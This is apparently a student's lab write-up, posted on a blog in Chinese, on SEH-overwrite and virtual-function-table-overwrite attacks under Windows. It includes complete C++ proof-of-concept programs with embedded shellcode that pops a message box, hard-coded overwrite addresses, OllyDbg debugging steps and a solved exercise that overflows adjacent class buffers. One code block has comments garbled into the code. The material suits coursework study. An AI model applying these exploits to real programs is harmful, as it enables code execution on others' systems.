---
title: 虚函数攻击与SEH 
date: 2019-12-12 23:12:35 
tags:
  - "网络空间安全"
  - "软件安全"
categories:
  - ["实验","软件安全"]
  - ["漏洞","SEH"]
  - ["漏洞","虚函数"]
comments: true

---

## 目标

了解SEH和虚函数攻击两种攻击方式，通过调试代码来理解进行上述攻击的过程。
<!-- more -->

## 测试步骤与结果

### SEH攻击

```c++ main.cpp
#include<windows.h>
#include<string>
char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x33\xDB\x53\x68\x62\x75\x70\x74\x68\x62\x75\x70\x74\x8B\xC4\x53"
"\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x48\xFE\x12\x00";
void MyExceptionHandler(void)
{
	printf("got an exception,press Enter to kill process!\n");
	getchar();
	ExitProcess(1);
}
void test(char* input)
{
	char buf[200];
	//printf("%d",strlen(shellcode));
	int zero=0;
	__asm int 3
	__try
	{
		strcpy(buf,input);
		zero=4/zero;
	}
	__except(MyExceptionHandler()){}
}
int main()
{
	LoadLibrary("user32.dll");
	test(shellcode);
	//test("abc");
	system("pause");
	return 0;
}
```

在此实验中，我们定义了一个自定义的错误处理函数`MyExceptionHandler()`，可以观察到，`__try`中试图除零，因此引发了一个异常，这个异常将由我们自定义的错误处理函数处理。如果`strcpy`操作溢出了，并精确地将栈帧中的SEH异常处理句柄修改为`shellcode`的入口地址时，操作系统将会错误地使用shellcode去处理除0异常，代码植入成功。 
{% note info %} 
前面的<code>__asm int 3</code>是为了使得调试器能够以attach的方式进行调试。 
{% endnote %}

1. 在ollydbg端完成实时调试配置，将它设置为实时调试器。 {% asset_img 1.png %}
2. 启动程序，在运行到int 3断点时成功进入ollydbg中。 
   {% note warning %} 
   初次进入时可能会有这个错误，设置一下udd和plugins的目录即可。 
   {% asset_img 2.png %} {% asset_img 3.png %} 
   {% endnote %}
3. 找到`strcpy`函数，并为其设置一个断点。 {% asset_img 4.png "可以看到这是在401158处" %} {% asset_img 5.png %}
4. 此时可以观察到shellcode的起始地址为`0x12fe48`。 {% asset_img 6.png %}
5. 触发异常时，我们查看SEH链：（查看→SEH链） 
   {% grouppicture 2-2 %} 
   {% asset_img 7.png %} 
   {% asset_img 8.png %} 
   {% endgrouppicture %}
6. 上方的第一个地址指向了下一个SEH记录：`0x12ffb0`。接着是SEH异常处理程序，我们只要把`0x12ff1c`的内容改成shellcode的起始地址就可以了。
7. 第一个SEH地址是`0x12ff18`，异常处理地址是`0x12ff1c`，我们的shellcode应该填充这些差值空间，总共有212个字节（0x12ff1c-0x12ff18） 
   {% note success no-icon %}
   回头看一眼我们要填入的shellcode，最后四字节(<code>\x48\xFE\x12\x00</code>)恰好是shellcode的起始地址！ 
   {% endnote %}
8. 去掉系统中断（`asm int 3`）后的运行效果如下，弹出对话框正是shellcode预期的功能。 {% asset_img 9.png %}

### 虚函数攻击

```c++ main.cpp
# include <windows.h>
# include <iostream.h>
char shellcode1[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x33\xDB\x53\x68\x62\x75\x70\x74\x68\x62\x75\x70\x74\x8B\xC4\x53"
"\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x5C\xE3\x42\x00";

class vf {
	public:
	char buf[200];
	virtual void test(void) {
		cout<<"Class Vtable::test()"<<endl;
	}
}
;
vf overflow, *p;
void main(void) {
	LoadLibrary("user32.dll");
	char * p_vtable;
	p_vtable=overflow.buf-4;
	//point to virtual table //__asm int 3 //reset
	fake virtual table to 0x004088cc //the address may need to adjusted via runtime debug p_vtable[0]=0x30; p_vtable[1]
	=0xE4;
	p_vtable[2]=0x42;
	p_vtable[3]=0x00;
	strcpy(overflow.buf,shellcode1);
	//set fake virtual function pointer
	p=&overflow;
	p->test();
}
```

1. 在`strcpy`处可能会触发溢出，修改虚函数指针。`Vtable`的值需要经过一次调试才可得知。  
   {% asset_img 10.png %} 
   {% asset_img 11.png %}

   从这两张图可以看出，缓冲区的入口为`0x0042e35c`。虚表指针位于缓冲区前，`p_vtable`定位到了这个指针，它指向了`0x0042e358`处，进一步证明缓冲区入口正确。

2. Shellcode的末尾后四个字节地址应该是`0x0042E430`。 {% asset_img 12.png %}

3. 更换shellcode和地址后，成功弹框，shellcode成功执行。 {% asset_img 13.png %}

## 测试结论

{% grouppicture 2-2 %} 
{% asset_img SEH.jpg "SEH异常处理攻击图示" %} 
{% asset_img vf.jpg "虚函数攻击图示" %} 
{% endgrouppicture %}

## 思考题

```c++
# include <windows.h>
# include <iostream.h>
# include <stdio.h>
class vf {
	public:
	char buf[200];
	virtual void test(void) {
		cout<<"Class Vtable::test()"<<endl;
	}
}
;
class vf1 {
	public:
	char buf[64];
	virtual void test(void) {
		cout<<"Class Vtable1::test()"<<endl;
	}
}
;
vf overflow, *p;
vf1 overflow1, *p1;
void main(int argc, char* argv[]) {
	LoadLibrary("user32.dll");
	//char * p_vtable;
	//p_vtable=overflow.buf-4;
	//point to virtual table
	//__asm int 3 
	//reset fake virtual table to 0x004088cc 
	//the address may need to adjusted via runtime debug
	//p_vtable[0]=0x30; 
	//p_vtable[1]=0xE4; 
	//p_vtable[2]=0x42; 
	//p_vtable[3]=0x00;
	if (argc == 3) {
		strcpy(overflow.buf,argv[1]);
		strcpy(overflow1.buf,argv[2]);
		//set fake virtual function pointer
		p=&overflow;
		p->test();
	} else {
		printf("vf argv1 argv2\n");
	}
}
```

1. 这应该是利用虚函数攻击的一个例子。其中定义了两个类：`vf`和v`f1`，`vf`具有200字节的`buf`大小，而`vf1`具有64字节的`buf`大小。我们需要提供两个参数，一个复制到`vf`的`buf`区，另一个复制到`vf1`
   的`buf`区中，要通过`vf`类的`test`方法调用shellcode。 {% asset_img 思考1.png %}
2. `argv[1]`被复制到`overflow.buf`中，起始地址为`0x42eb5c`。算出其终止地址应为`0x42ec20`。 
   {% asset_img 思考2.png %} 
   {% asset_img 思考3.png "前面四个字节0x0042801c应该是vtable的地址，一会我们要覆盖掉它" %}

3. 第二个`strcpy`时，将第二个参数拷贝到`overflow1.buf`中，其首地址为`0x42eb14`，在`overflow`上方，我们想到应该可以利用这个关系，溢出这个64字节的`buf`，覆盖掉`vtable`，让其调用shellcode 
   {% asset_img 思考4.png %} {% asset_img 思考5.png %}

4. 构造shellcode如下，其中插入`vf`中的shellcode1写入弹框代码，插入`vf1`中的shellcode2向下覆盖掉`vf1`的`vtable`
   ，变为shellcode1的尾地址，而令shellcode1中最后四字节为shellcode第一个指令的地址（即`overflow.buf`的起始位置）。在这个构造下，可以成功执行shellcode，以弹出对话框。 
   {% grouppicture 2-2 %} {% asset_img argv[1].png "argv[1]" %} {% asset_img argv[2].png "argv[2]" %} {% endgrouppicture %}
   {% asset_img 思考8.png %}

5. 利用成功截图。 {% asset_img 思考9.png %}
